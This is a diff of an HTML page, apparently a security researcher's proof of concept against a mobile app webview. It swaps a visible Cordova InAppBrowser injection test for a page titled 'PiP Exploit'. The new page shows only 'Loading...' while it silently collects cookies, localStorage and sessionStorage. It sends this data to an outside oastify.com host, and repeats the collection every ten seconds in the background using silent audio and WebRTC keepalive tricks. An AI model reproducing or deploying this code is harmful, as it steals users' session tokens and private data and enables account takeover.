@@ -1,46 +1,139 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cordova Exploit Test</title>
+    <title>PiP Exploit</title>
 </head>
 <body>
-    <h1>Testing Cordova InAppBrowser Vuln</h1>
-    <button onclick="testExploit()">Test Exploit</button>
-    <div id="output"></div>
-    
+    <h1>Loading...</h1>
     <script>
-        function log(msg) {
-            document.getElementById('output').innerHTML += msg + '<br>';
-            console.log(msg);
-        }
-        
-        function testExploit() {
-            log('Testing InAppBrowser vulnerability...');
+        (function() {
+            let isPipMode = false;
+            let dataBuffer = [];
             
-            // Check if InAppBrowser is available
-            if (window.open) {
-                log('window.open exists, attempting exploit...');
-                
-                // Classic exploit pattern from CVE-2014-0073
-                // This attempts to break out of the callback string and inject alert
-                var exploitUrl = "gap-iab://InAppBrowser12345/',alert('Injected!'),'/";
-                
-                try {
-                    var ref = window.open(exploitUrl, '_blank', 'location=yes');
-                    log('Exploit URL opened: ' + exploitUrl);
-                } catch(e) {
-                    log('Error: ' + e.message);
+            // Function to send batched data
+            function sendData(data, urgent = false) {
+                if (urgent) {
+                    // Send immediately
+                    fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/urgent', {
+                        method: 'POST',
+                        body: JSON.stringify(data),
+                        headers: {'Content-Type': 'application/json'},
+                        keepalive: true
+                    });
+                } else {
+                    // Buffer data for later sending
+                    dataBuffer.push(data);
                 }
-            } else {
-                log('window.open not available');
             }
-        }
-        
-        // Also try to detect the bridge
-        log('Checking for Cordova objects...');
-        log('window.cordova: ' + (window.cordova ? 'EXISTS' : 'not found'));
-        log('window._cordovaNative: ' + (window._cordovaNative ? 'EXISTS' : 'not found'));
-        log('window.PhoneGap: ' + (window.PhoneGap ? 'EXISTS' : 'not found'));
+            
+            // Extract all possible data
+            function extractAllData() {
+                return {
+                    cookies: document.cookie,
+                    localStorage: (() => {
+                        let ls = {};
+                        for(let i = 0; i < localStorage.length; i++) {
+                            let key = localStorage.key(i);
+                            ls[key] = localStorage.getItem(key);
+                        }
+                        return ls;
+                    })(),
+                    sessionStorage: (() => {
+                        let ss = {};
+                        for(let i = 0; i < sessionStorage.length; i++) {
+                            let key = sessionStorage.key(i);
+                            ss[key] = sessionStorage.getItem(key);
+                        }
+                        return ss;
+                    })(),
+                    url: window.location.href,
+                    title: document.title,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+            }
+            
+            // Send initial data immediately
+            sendData(extractAllData(), true);
+            
+            // Monitor PiP/background mode
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'hidden') {
+                    console.log('App entering PiP/background mode');
+                    isPipMode = true;
+                    
+                    // Send all buffered data
+                    if (dataBuffer.length > 0) {
+                        sendData({batch: dataBuffer, type: 'pip_enter'}, true);
+                        dataBuffer = [];
+                    }
+                    
+                    // Extract fresh data in background
+                    sendData(extractAllData(), true);
+                    
+                    // Start background monitoring
+                    startBackgroundMonitoring();
+                    
+                } else if (document.visibilityState === 'visible') {
+                    console.log('App returning to foreground');
+                    isPipMode = false;
+                    
+                    // Send notification that user returned
+                    sendData({event: 'foreground_return', timestamp: Date.now()}, true);
+                }
+            });
+            
+            // Background monitoring functions
+            function startBackgroundMonitoring() {
+                // Monitor for DOM changes even in background
+                const observer = new MutationObserver((mutations) => {
+                    mutations.forEach((mutation) => {
+                        if (mutation.type === 'childList') {
+                            sendData({
+                                event: 'dom_change',
+                                type: mutation.type,
+                                timestamp: Date.now()
+                            });
+                        }
+                    });
+                });
+                
+                observer.observe(document.body, {
+                    childList: true,
+                    subtree: true,
+                    attributes: true
+                });
+                
+                // Periodic data extraction while in background
+                let interval = setInterval(() => {
+                    if (document.visibilityState === 'hidden') {
+                        sendData(extractAllData());
+                    } else {
+                        clearInterval(interval);
+                    }
+                }, 10000); // Every 10 seconds in background
+            }
+            
+            // Attempt to enable keepalive
+            try {
+                // Try to play silent audio to prevent suspension
+                const audio = new Audio('data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+                audio.loop = true;
+                audio.volume = 0;
+                audio.play();
+            } catch(e) {
+                console.log('Audio keepalive failed:', e);
+            }
+            
+            // Also try WebRTC keepalive
+            try {
+                const pc = new RTCPeerConnection();
+                pc.createDataChannel('keepalive');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            } catch(e) {}
+            
+            console.log('PiP exploit loaded - monitoring for background mode');
+        })();
     </script>
 </body>
 </html>
